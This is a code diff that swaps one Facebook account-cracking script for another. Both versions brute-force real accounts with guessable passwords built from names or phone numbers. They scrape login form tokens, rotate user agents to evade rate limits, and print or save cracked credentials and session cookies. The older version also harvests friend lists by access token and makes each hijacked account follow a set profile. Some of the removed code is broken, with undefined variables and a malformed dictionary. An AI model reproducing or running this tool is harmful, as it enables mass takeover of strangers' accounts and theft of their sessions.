@@ -1,465 +1,322 @@
-#!/usr/bin/python3
-import os
-try:
-    import requests
-except ImportError:
-    print('\n [✓] installing requests !...\n')
-    os.system('pip install requests')
+import time,os,json,sys,re,string, random 
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
 
 try:
-    import concurrent.futures
-except ImportError:
-    print('\n [✓] installing futures !...\n')
-    os.system('pip install futures')
+    import rich
+except:
+    print("\n[!?] Installing Rich...\n")
+    os.system("pip install rich")
+    import rich
+
+try:
+    import requests
+except:
+    print("\n[!?] Installing Requests...\n")
+    os.system("pip install requests")
+    import requests
+
+try:
+    import httpx
+except:
+    print("\n[!?] Installing Httpx...\n")
+    os.system("pip install httpx")
+    import httpx
 
 try:
     import bs4
-except ImportError:
-    print('\n [✓] installing bs4 !...\n')
-    os.system('pip install bs4')
-
-import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
-from concurrent.futures import ThreadPoolExecutor as sarfrazssb
-from datetime import datetime
-from bs4 import BeautifulSoup
+except:
+    print("\n[!?] Installing Bs4...\n")
+    os.system("pip install bs4")
+    import bs4
 
 
-ct = datetime.now()
-n = ct.month
-bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
-try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
 
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
-P = '\x1b[1;97m' # 
-M = '\033[1;31m' # 
-H = '\033[1;32m' # 
-K = '\x1b[1;97m' # 
-B = '\x1b[1;97m' # 
-U = '\x1b[1;97m' # 
-O = '\x1b[1;97m' # 
-N = '\x1b[0m'    # 
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-data,data2={},{}
-aman,cp,salah=0,0,0
-ubahP,fuck,pwBaru=[],[],[]
-ok = []
-cp = []
-id = []
-user = []
-loop = 0
-url_lookup = "https://lookup-id.com/"
-url_mb = "https://m.facebook.com"
-url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"}
-bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
-done = False
+from os import system as shell
+from rich import print
+from rich import print_json
+from rich import pretty
+from rich.progress import track
+from rich.markdown import Markdown
+from rich.tree import Tree
+from rich.panel import Panel
+from rich.padding import Padding
+pretty.install()
 
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
+from datetime import datetime 
+ct=str(datetime.now())
+ct2=ct.split(" ")[0]
+ct3=ct2.split("-")[1]
+mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
+month=mon[ct3]
+datea=ct2.split("-")[2]
+
+
+def lod(message):
+    
+    for i in track(range(300), description=f"[red][bold] {message}"):
         time.sleep(0.01)
 
-logo =                                          """   
-   \033[1;37m ######      ######     ########  
-   \033[1;37m##    ##    ##    ##    ##     ## 
-   \033[1;37m##          ##          ##     ## 
-   \033[1;37m ######      ######     ########  
-   \033[1;37m     b ##          ##    ##     ## 
-   \033[1;37m##    ##    ##    ##    ##     ## 
-   \033[1;37m ######      ######     ########  
-\x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Sarfraz Baloch
-\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Sarfraz Baloch
-\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Sarfraz-Ssb
-\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.0.0
-\033[1;37m------------------------\033[1;37m------------------------ """                                              
-
-def hasil(OK,cp):
-	if not len(OK) != 0:
-	    pass
-	if len(cp) != 0:
-	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSSB_OK.txt' % (H, P, str(len(ok))))
-	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
-	    input("\x1b[1;97mPress enter to back SSB Menu ")
-	    sarfraz()
-
-def sarfraz():
-    os.system('clear')
-    print(logo)
-    ipm = requests.get(url_ip).json()
-    todz = ''
-    IP = ipm['origin']
-    print
-    print(' [1] Start File Cloning')
-    print(' [2] Create File [Best-Method]')
-    print(' [E] exit ')
-    print('')
-    _sarfraz___ = input(' [?] Choose option : ')
-    if _sarfraz___ in ('1', '01'):
-        __xxx__().sarfrazx(id)
-    if _sarfraz___ in ('2', '02'):
-        create_file()
-    if _sarfraz___ in ('E', 'ee'):
-        pass
 
 
-class __xxx__:
-    def __init__(self):
-        self.id = []
-    def sarfrazx(self,id):
-        os.system("clear")
-        print(logo)
-        self.cnt = input('Put File Name : ')
-        self.id = open(self.cnt).read().splitlines()
-        os.system('clear')
-        print(logo)
-        print("")
-        ___worldwide___ = ('y')
-        if ___worldwide___ in ('yes','Yes','Y', 'y'):
-            self.__pler__()
-        else:
-            print(' [!] Choose Correct One');
-            self.sarfrazx(id)
-    def __metode__(self, user, __chi__, cebok):
-        global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[SSB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
-        sys.stdout.flush()
-        try:
-            for pw in __chi__:
-                pw = pw.lower()
-                session=requests.Session()
-                data = {"adid": adid,
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": rid,
-                    "password": ps,
-                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d",}
-                    headers={'User-Agent': "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"}
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': '25227',
-                    'X-FB-SIM-HNI': '29752',
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-                    'Content-Length': '706'}
-                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
-                if 'c_user' in session.cookies.get_dict():
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [SSB-OK] {user} | {pw}")
-                    wrt = '%s|%s' % (user,pw)
-                    ok.append(wrt)
-                    open('SSB_OK.txt' , 'a').write('%s\n' % wrt)
-                    self.follow(session,coki)
-                    break
-                elif 'checkpoint' in session.cookies.get_dict():
-                    try:
-                        tokenz = open('.token.txt').read()
-                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
-                        month, day, year = cp_ttl.split('/')
-                        month = bulan_ttl[month]
-                        print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
-                        wrt = '%s|%s' % (user,pw)
-                        cp.append(wrt)
-                        open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
-                        break
-                    except (KeyError, IOError):
-                        month = ''
-                        day   = ''
-                        year  = ''
-                    except:
-                        pass
-                    print('\r%s [SSB-CP] %s | %s ' % (M, user, pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('SSB_CP.txt' , 'a').write('%s\n' % wrt)
-                    break
-                else:
-                    continue
-            loop+=1
-        except:
-            self.__metode__(user, pw, cebok)
+def clear():
+    shell("clear")
 
-    def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
-        get = r.find('a', string='Ikuti').get('href')
-        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+def logo():
+    clear()
+    print("""
+   _ __ ___  ___   _   _  __
+  /// // _/ / o |,' \ / |/ /
+ / ` // _/ /  ,'/ o |/ || / 
+/_n_//___//_/`_\|_,'/_/|_/       0.1
+    """)
+    
+def space():
+    print("\n")
 
-    def __pler__(self):
-        print('[1] Crack With Auto Pass ')
-        print('[2] Crack With Name Digit Pass')
-        chi = input('\n [?] Choose: ')
-        if chi == '':
-            print('\nSelect Correct One')
-            self.__pler__()
-        elif chi in ('1', '01'):
-            os.system("clear")
-            print(logo)
-            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
-            print(47*"-")
-            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
-            print('\033[1;37m Cracking Started...')
-            print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
-                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        uid, name = zsb.split('|')
-                        xz = name.split(' ')
-                        first, last = name.split(' ')
-                        firstl = first.lower()
-                        lastl = last.lower()
-                        firsts = first.capitalize()
-                        lasts = last.capitalize()
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"1122", xz[0]+"@", xz[0]+"@@", xz[0]+"@@@"]
-                        else:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"1122", xz[0]+"@", xz[0]+"@@", xz[0]+"@@@"]
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"1122", xz[0]+"@", xz[0]+"@@", xz[0]+"@@@"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
-                    except:
-                        pass
-            hasil(ok,cp)
-        elif chi in ('2', '02'):
-            os.system("clear")
-            print(logo)
-            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
-            p1 = input('  Name + 1 : ')
-            p2 = input('  Name + 2 : ')
-            p3 = input('  Name + 3 : ')
-            p4 = input('  Name + 4 : ')
-            os.system("clear")
-            print(logo)
-            print("\033[1;31m\rUse flight (airplane) mode before use\033[1;37m")
-            print(47*"-")
-            print('\033[1;37m Total IDs : %s ' % len(self.id))
-            print('\033[1;37m Cracking Started...')
-            print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
-                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        uid, name = zsb.split('|')
-                        xz = name.split(' ')
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
-                    except:
-                        pass
-            hasil(ok,cp)
-        else:
-            print('\n Select Valid One')
-            self.__pler__()
 
-def create_file():
-    os.system('clear')
-    print(logo)
-    print('  [1] Create file manual')
-    print('  [2] Create file auto')
-    print('  [B] Back to main menu')
-    print(50*'-')
-    cf = input('  Choose method: ')
-    if cf =='1':
-        manual()
-    elif cf =='2':
-        auto()
-    elif cf =='3':
-        likes()
-    elif cf =='3' or cf =='b' or cf =='B':
-        main()
+number=int("+8801944981090")
+
+devoloper_info={
+    "Developer" :  'HERON AFRIDI',
+    "Number" :  number,
+    "Status" :  '24-ONLINE',
+    "GitHub Url":  'https://github.com/TEAM-ELITE1',
+    "Facebook" :  'facebook.com/Freestyle.0fficial',
+    }
+
+date={
+    "Day":datea,
+    "Month":month,
+ }
+mj=Tree("[bold purple]![[bold red]A[bold purple]] ")
+mj.add("[cyan][bold]RANDOM CLONEING ").add("[bold green][GOOD]")
+
+mx=Tree("[bold purple]![[bold red]B[bold purple]] ")
+mx.add("[bold yellow]FILE CLONEING").add("[bold green][GREAT]")
+
+my=Tree("[bold purple]![[bold red]C[bold purple]] ")
+my.add("[tan][bold]REPORT BUG ")
+
+cv=Tree("[bold blue][>+<]")
+cv.add("[bold red]Choice Option")
+
+
+
+ugen=[]
+for x in range(1000):
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+
+
+note1="""- __Inbox__ Me for Join `Team Elite`\n- Try tool and **Review**"""
+n1=Markdown(note1)
+
+note2="""#  __RANDOM CLONEING TASK BOX__\n- Choice BD code \n- And Put Limit"""
+n2=Markdown(note2)
+
+note3="""- __System__ Starting Bro Wait\n- Follow our **FB Group**\n- Inbox Me For Anything"""
+n3=Markdown(note3)
+
+note4="""- Use Airplane mode in every 3 minutes \n- Use APN For Get More Ok ID \n- Cracking Started """
+n4=Markdown(note4)
+
+nv = Padding("TOOL MENU", style="on green", expand=False)
+cxx = Padding("DONE",(1,2), style="on green", expand=False)
+
+
+
+import os
+try:
+    open(".itu.txt","r").read()
+except:
+    os.system("pkg install play-audio")
+    open(".itu.txt","w").write("__&")
+try:
+    import gtts
+except:
+    os.system("pip install gtts")
+    import gtts
+from gtts import gTTS
+
+def create_(text,file):
+    my_a = gTTS(text)
+    my_a.save(file)
+
+
+def play_audio(audio_file):
+    os.system("play-audio "+audio_file)
+
+def dual(text,file):
+    create_(text,file)
+    play_audio(file)
+    
+
+ok=[]
+ok.append("199")
+loop=0
+def main():
+    logo()
+    space()
+    print(n3)
+    space()
+    lod("STARTING TOOL...")
+    logo()
+    print_json(data=devoloper_info)
+    print(Panel(n1,title="[bold red]NOTE"))
+    space()
+    #dual("Hello bro,I am Zara,I am an artificial intelligent,and welcome to our tool","y.mp3")
+    
+    print(nv)
+    space()
+    print(mj)
+    print(mx)
+    print(my)
+    space()
+    print(cv)
+    choice=input("    └──>")
+    if choice in ["a","A","1","01"]:
+        numb()
     else:
-        print('\n  Choose correct option ...')
-        time.sleep(1)
-        create_file()
+        numb()
 
-def manual():
-    try:
-        token = open('/sdcard/tokenofl.txt', 'r').read()
-    except FileNotFoundError:
-        login()
-    try:
-        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
-        q = json.loads(r)
-        uname = q['name']
-    except (KeyError):
-        login()
-    os.system('clear')
-    print(logo)
-    print('  Name: '+uname)
-    print(50*'-')
-    limit = int(input('  How many ids do you want to add ? '))
-    save_file = input('  Save file as: ')
-    t = 0
-    for u in range(limit):
-        t+=1
-        try:
-            ids = input('  Put id no%s: '%t)
-            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
-            q = json.loads(r)
-            for j in q['data']:
-                uids = j['id']
-                names = j['name']
-                first_name = names.split(' ')[0]
-                try:
-                    last_name = names.split(' ')[1]
-                except:
-                    last_name = 'Khan'
-                with open('/sdcard/'+save_file, 'a') as rd:
-                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')
-        except KeyError:
-            print('  No friend for '+ids)
-            pass
-    print(50*'-')
-    print('  Ids saved as: '+save_file)
-    print(50*'-')
-    input(' Press enter to back')
-    sarfraz()
+def numb():
+    user=[]
+    logo()
     
-def auto():
-    os.system('rm -rf temp*')
+    print(n2)
+    space()
+    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example 017, 019, 016, ")
+    code=input("                        ✓ Choice ->")
+    print("                      [bold yellow]  ✓ [bold green]You Choosed "+code)
+    space()
+    space()
+    print("    [bold red]LIMIT              [bold yellow] ✓ [bold green]Example 1000,2000,3000") 
+    limit=int(input("                        ✓ Choice ->"))
+    print("                      [yellow] [bold] ✓[bold green] Crack Limit ",limit)
+    print(cxx)
+    space()
+    for i in track(range(limit),description="      Dumping"):
+        numx=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(numx)
+    #dual("Dumping successful","y.mp3")
+    
+    with ThreadPool (max_workers=90) as feel:
+        logo()
+        print(Markdown("# CHOOSE MATHOD"))
+        space()
+        Mathi1=Tree("[bold white][A/1]")
+        Mathi1.add("M. FACEBOOK ")
+        print(Mathi1)
+        space()
+        Mathi2=Tree("[bold green][B/2]")
+        Mathi2.add("MBASIC. FACEBOOK ")
+        print(Mathi2)
+        space()
+        Mathi3=Tree("[bold blue][C/3]")
+        Mathi3.add("P. FACEBOOK ")
+        print(Mathi3)
+        space()
+        Mathi4=Tree("[bold yellow][D/4]")
+        Mathi4.add("X. FACEBOOK ")
+        print(Mathi4)
+        space() 
+        Mathi5=Tree("[bold red][E/5]")
+        Mathi5.add("FREE. FACEBOOK ")
+        print(Mathi5)
+        space()
+        Mathi6=Tree("[bold cyan][F/6]")
+        Mathi6.add("TOUCH. FACEBOOK ")
+        print(Mathi6)
+        space()
+        jbs=input("                [✓] choice:")
+        if jbs in ["1","A","a","01"]:
+            tsg="m"
+        elif jbs in ["2","B","b","02"]:
+            tsg="mbasic"
+        elif jbs in ["3","C","c","03"]:
+            tsg="p"
+        elif jbs in ["4","D","d","04"]:
+            tsg="x"
+        elif jbs in ["5","E","e","05"]:
+            tsg="free"
+        elif jbs in ["6","F","f","06"]:
+            tsg="touch"
+        else:
+            tsg="m"
+        logo()
+        tl=str(len(user))
+        tl_=Tree("[green]Total ID ")
+        tl_.add("[bold green]"+tl)
+        mathod=Tree("[blue]Mathod")
+        mathod.add("[bold blue]"+tsg)
+        
+        space()
+        print(n4)
+        space()
+        print_json(data=date)
+        space()
+        print(tl_)
+        space()
+        print(mathod)
+        print(Markdown("# Crack Started"))
+        space()
+        for i in user:
+            uid=code+i
+            fb=tsg
+            pwx=[]
+            pwx.append(uid[5:])#back 6
+            pwx.append(uid[4:])#back 7
+            pwx.append(uid[3:])#back 8
+            pwx.append(uid[:6])#front 6
+            pwx.append(uid[:7])#front 7
+            pwx.append(uid[:8])#front 8
+            pwx.append(uid)# 11
+            feel.submit(need,uid,pwx,fb,tl)
+
+
+
+def need(uid,pwx,fb,tl):
+    global ok,ugen,loop
+    session=requests.session()
+    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m✘D\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
+    sys.stdout.flush()
     try:
-        access_token = open('/sdcard/tokenofl.txt', 'r').read()
-    except:
-        login()
-    try:
-        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
-        q = json.loads(r)
-        uname = q['name']
-    except:
-        login()
-    os.system('clear')
-    print(logo)
-    print('  Logged user: '+uname)
-    print(50*'-')
-    nusrat = []
-    try:
-        limit_user = int(input('  How many ids do you want to add ? '))
-    except:
-        limit_user = 1
-    count = 0
-    for fir in range(limit_user):
-        count +=1
-        udit = input('  Put id%s: '%(count))
-        try:
-            tfile = open('/sdcard/tokenofl.txt','r').read()
-            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
-            qfr = json.loads(fr)
-            temp_save = open('temp.txt', 'a')
-            for data in qfr['data']:
-                uids = data['id']
-                if uids in nusrat:
-                    pass
-                else:
-                    nusrat.append(uids)
-                    temp_save.write(uids+'\n')
-            temp_save.close()
-        except KeyError:
-            if 'invalid' in str(fr):
-                print('  Logged token has expired ...')
-                pass
+        for ps in pwx:
+            uuu=random.choice(ugen)
+            free_fb = session.get(f'https://{fb}.facebook.com').text
+            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
+            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
+            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
+            heron_brand=session.cookies.get_dict().keys()
+            if "c_user" in heron_brand:
+                hh=str(len(ok))
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                xx=coki.split("c_user=")[1]
+                xd=xx[:15]
+                print("\r\r\n\n")
+                print(Panel(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
+                #print(f"\r\r\n[white reverse][🔷]=UID/PAS[/white reverse] [bold green]{xd} [cyan]• [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[🔶][/yellow reverse][bold green]{coki}\n")
+                
+                ok.append(uid)
+                break
+            
             else:
-                print('  No friends found for user: '+udit)
-                pass
-    os.system('clear')
-    print(logo)
-    print('   Total ids: '+str(len(nusrat)))
-    print(50*'-')
-    try:
-        ask_link = int(input('  How many links do you want to grab? '))
+                continue
+        loop+=1
     except:
-        ask_link = 1
-    completed = 0
-    for links in range(ask_link):
-        completed +=1
-        li = input('  %s Link start with: '%completed)
-        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
-    save_file = input('  Save file as: ')
-    os.system('clear')
-    lines = open('temp2.txt', 'r').readlines()
-    print(logo)
-    print('  Total ids to grab: '+str(len(lines)))
-    print('  Grabbing Process has started')
-    print(50*'-')
-    fileid = 'temp2.txt'
-    fileidopen = open(fileid, 'r').read().splitlines()
-    dill = []
-    for ids in fileidopen:
-        try:
-            tfile = open('/sdcard/tokenofl.txt','r').read()
-            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text
-            rgq = json.loads(rg)
-            idsave=open('/sdcard/'+save_file, 'a')
-            for inayat in rgq['data']:
-                uids = inayat['id']
-                dill.append(uids)
-                nm = inayat['name']
-                first_name = nm.split(' ')[0]
-                try:
-                    last_name = nm.split(' ')[1]
-                except:
-                    last_name = 'Khan'
-                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')
-            print('  Grabbed from: '+ids)
-           # print('  Total friends: '+str(len(uids)))
-            print('  Token status: Live')
-            print(50*'-')
-            idsave.close()
-        except Exception as e:
-            #print(e)
-            if 'invalid' in str(rg):
-                print('  Token has expired, try again ...')
-                os.system('rm -rf temp*')
-                pass
-            else:
-                print('  Grabbed from: '+ids)
-                print('  Friendlist ids: 0')
-                print('  Token status: Live')
-                print(50*'-')
-                os.system('rm -rf temp*')
-                pass
-    lenid = open('/sdcard/'+save_file, 'r').readlines()
-    print('  Grabbing Process has completed ')
-    os.system('rm -rf temp*')
-    print('  Total ids grabbed: '+str(len(lenid)))
-    print('  File saved as: /sdcard/'+save_file)
-    print(50*'-')
-    input('  Press enter to back ')
-    safraz()
-    
-    
-    
-sarfraz()
+        time.sleep(15)
+
+main()
